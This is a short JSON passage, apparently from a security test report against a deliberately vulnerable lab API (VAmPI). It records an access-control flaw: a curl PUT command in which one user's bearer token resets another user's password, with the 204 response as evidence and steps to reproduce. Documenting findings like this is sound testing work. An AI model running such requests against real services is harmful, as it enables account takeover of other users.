      "command": "curl -X PUT http://vuln-vampi:5000/users/v1/name1/password -H 'Authorization: Bearer <name2_token>' -d '{\"password\":\"pwned123\"}'",
      "evidence": "HTTP 204. Verified via _debug: name1 password changed from pass1 to pwned123",
      "steps_to_reproduce": [
        "Login as name2",
        "PUT /users/v1/name1/password",
        "Returns 204",
        "Verify via _debug",
        "Login as name1 with new password succeeds"
